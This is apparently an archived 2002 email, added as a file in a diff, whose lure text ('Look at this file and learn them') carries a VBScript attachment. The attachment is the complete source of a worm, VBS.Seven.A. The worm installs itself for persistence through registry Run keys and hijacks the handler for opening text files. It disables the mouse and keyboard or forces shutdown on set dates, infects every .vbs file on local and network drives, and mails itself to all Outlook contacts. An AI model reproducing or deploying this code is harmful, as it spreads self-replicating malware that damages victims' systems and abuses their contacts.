@@ -1,0 +1,163 @@
+From: "Gilbert GAUMAN" <etiennek75@hotmail.com>
+To: "petikvx@multimania.com"
+Subject: What is the seven sins ??
+Date: Tue, 5 Feb 2002 11:28:57 +0100
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0022_01C1AE38.4FA68800"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Unsent: 1
+X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2615.200
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0022_01C1AE38.4FA68800
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+Look at this file and learn them.
+
+------=_NextPart_000_0022_01C1AE38.4FA68800
+Content-Type: application/octet-stream;
+	name="seven.vbs"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment;
+	filename="seven.vbs"
+
+'VBS.Seven.A
+On Error Resume Next
+Set fso=3DCreateObject("Scripting.FileSystemObject")
+Set ws=3DCreateObject("WScript.Shell")
+Set win=3Dfso.GetSpecialFolder(0)
+Set sys=3Dfso.GetSpecialFolder(1)
+Set tmp=3Dfso.GetSpecialFolder(2)
+
+SEVEN()
+
+Sub SEVEN()
+Set org=3Dfso.GetFile(WScript.ScriptFullname)
+org.Copy(win&"\Seven.vbs")
+org.Copy(sys&"\Envy.vbs")
+org.Copy(tmp&"\Lust.vbs")
+run=3D("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Envy")
+runs=3D("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Lust"=
+)
+ws.RegWrite run,sys&"\Envy.vbs"
+ws.RegWrite runs,tmp&"\Lust.vbs"
+First()
+Second()
+Third()
+Disk()
+Send()
+End Sub
+
+Sub First()
+If Day(Now)=3D1 or Day(Now)=3D15 or Day(Now)=3D30 Then
+run2=3D("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Anger")
+ws.RegWrite run2,"rundll32 mouse,disable"
+End If
+End Sub
+
+Sub Second()
+If Day(Now)=3D12 or Day(Now)=3D28 Then
+MsgBox "You're tired now"+VbCrLf+"Switch off you're =
+Computer",vbExclamation,"Seven"
+ws.Run "rundll32.exe user.exe,exitwindows"
+End If
+If Day(Now)=3D14 Then
+MsgBox "The keyboard is on strike !",vbInformation,"Seven"
+ws.Run "rundll32 keyboard,disable"
+End If
+End Sub
+
+Sub Third()
+If Day(Now)=3D5 or Day(Now)=3D17 Then
+bur=3Dws.RegRead("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentV=
+ersion\Explorer\Shell Folders\Desktop")
+if not fso.FileExists(win&"\COPYRIGHT.txt.vbs") Then
+txt=3Dws.RegRead("HKCR\txtfile\shell\open\command\")
+ws.RegWrite "HKCR\txtfile\shell\open\command\Pride",txt
+ws.RegWrite "HKCR\txtfile\shell\open\command\","wscript =
+"&win&"\Seven.vbs"
+icot=3Dws.RegRead("HKCR\txtfile\DefaultIcon\")
+icov=3Dws.RegRead("HKCR\VBSfile\DefaultIcon\")
+ws.RegWrite "HKCR\VBSfile\DefaultIcon\oldicon",icov
+ws.RegWrite "HKCR\VBSfile\DefaultIcon\",icot
+Set copy=3Dfso.CreateTextFile (bur&"\COPYRIGHT.txt.vbs")
+copy.WriteLine "MsgBox ""You're infected by my new =
+Worm""+VbCrLf+VbCrLf+""	By PetiK (c)2001"",vbcritical,""VBS.Seven.A"""
+copy.Close
+Set copy=3Dfso.CreateTextFile (win&"\COPYRIGHT.txt.vbs")
+copy.WriteLine "MsgBox ""You're infected by my new =
+Worm""+VbCrLf+VbCrLf+""	By PetiK (c)2001"",vbcritical,""VBS.Seven.A"""
+copy.Close
+end if
+End If
+End Sub
+
+Sub Disk
+Set dr=3Dfso.Drives
+For Each d in dr
+If d.DriveType=3D2 or d.DriveType=3D3 Then
+list(d.path&"\")
+end If
+Next
+End Sub
+Sub infect(dossier)
+Set f=3Dfso.GetFolder(dossier)
+Set fc=3Df.Files
+For each f1 in fc
+ext=3Dfso.GetExtensionName(f1.path)
+ext=3Dlcase(ext)
+If (ext=3D"vbs") Then
+Set cot=3Dfso.OpenTextFile(f1.path, 1, False)
+If cot.ReadLine <> "'VBS.Seven.A" then
+cot.Close
+Set cot=3Dfso.OpenTextFile(f1.path, 1, False)
+vbsorg=3Dcot.ReadAll()
+cot.Close
+Set inf=3Dfso.OpenTextFile(f1.path,2,True)
+inf.WriteLine "'VBS.Seven.A"
+inf.Write(vbsorg)
+inf.WriteLine ""
+inf.WriteLine "Set w=3DCreateObject(""WScript.Shell"")"
+inf.WriteLine "Set f=3DCreateObject(""Scripting.FileSystemObject"")"
+inf.WriteLine "w.run f.GetSpecialFolder(0)&""\Seven.vbs"""
+inf.Close
+End If
+End If
+Next
+End Sub
+Sub list(dossier)
+Set f=3Dfso.GetFolder(dossier)
+Set sf=3Df.SubFolders
+For each f1 in sf
+infect(f1.path)
+list(f1.path)
+Next
+End Sub
+
+Sub Send()
+Set A=3DCreateObject("Outlook.Application")
+Set B=3DA.GetNameSpace("MAPI")
+For Each C In B.AddressLists
+If C.AddressEntries.Count <> 0 Then
+For D=3D1 To C.AddressEntries.count
+Set E=3DC.AddressEntries(D)
+Set F=3DA.CreateItem(0)
+F.To=3DE.Address
+F.Subject=3D"What is the seven sins ??"
+F.Body=3D"Look at this file and learn them."
+Set G=3DCreateObject("Scripting.FileSystemObject")
+F.Attachments.Add G.BuildPath(G.GetSpecialFolder(0),"Seven.vbs")
+F.DeleteAfterSubmit=3DTrue
+If F.To <> "" Then
+F.Send
+End If
+Next
+End If
+Next
+End Sub
+------=_NextPart_000_0022_01C1AE38.4FA68800--
